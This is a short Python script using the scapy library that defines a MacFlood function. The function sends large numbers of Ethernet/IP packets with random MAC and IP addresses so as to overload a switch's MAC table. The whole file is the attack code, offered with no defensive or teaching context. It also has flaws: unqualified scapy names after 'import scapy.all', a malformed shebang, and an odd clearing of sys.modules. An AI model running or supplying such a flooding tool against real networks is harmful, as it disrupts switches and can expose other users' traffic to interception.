#!usr/bin/env python
import sys
import scapy.all






# Sending a flood of IP packets with random IP and MAC addresses in order to overload the target MAC table
def MacFlood(Interface,PckNbr):
    packet_list = []		#initializing packet_list to hold all the packets
    #Preparing the list of packets to send improves the sending rates
    for i in xrange(1,PckNbr):
        packet  = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
        packet_list.append(packet)
    sendp(packet_list,iface=Interface)

    #Clear imported modules in order to prevent "next import" issue
    sys.modules.clear()
    return 0
